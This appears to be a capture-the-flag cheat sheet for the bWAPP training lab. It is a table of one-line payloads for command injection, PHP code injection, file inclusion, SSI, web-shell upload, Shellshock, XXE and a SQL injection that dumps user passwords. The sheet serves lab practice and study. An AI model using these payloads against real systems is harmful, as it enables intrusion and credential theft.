# bWAPP (buggy Web APPlication)

Setup: `/install.php` → "install", login `bee:bug` at `/login.php`, choose a bug from the dropdown
+ security level (low/medium/high, cookie `security_level=0|1|2`).

## Fastest route to the flag (env var)
| Bug | Payload |
|---|---|
| OS Command Injection (`commandi.php`) | `www.nsa.gov; env` (low) / `www.nsa.gov \| env` |
| OS Command Injection - Blind | `; env > /var/www/bWAPP/documents/x.txt` then GET it |
| PHP Code Injection (`phpi.php?message=`) | `?message=test;system('env')` |
| Remote & Local File Inclusion (`rlfi.php?language=`) | `?language=/proc/self/environ` |
| Server-Side Includes (SSI) | `<!--#exec cmd="env" -->` in first name |
| Unrestricted File Upload | `shell.php` → `/images/shell.php?c=env` |
| Shellshock (`shellshock.php`) | `Referer: () { :;}; echo; /usr/bin/env` on the CGI iframe URL |
| XXE (`xxe-1.php`) | `file:///proc/self/environ` entity in `<login>` |
| SQL Injection (`sqli_1.php?title=`) | `' UNION SELECT 1,login,password,4,5,6,7 FROM users-- -` |

Pick the module, then follow the generic note:
[cmdi](../05-injection/cmdi.md) · [code-injection](../05-injection/code-injection.md) ·
[lfi](../05-injection/lfi-path-traversal.md) · [xxe](../05-injection/xxe.md) ·
[shellshock](../05-injection/shellshock.md) · [file-upload](../05-injection/file-upload.md) ·
[06-sqli](../06-sqli/README.md).
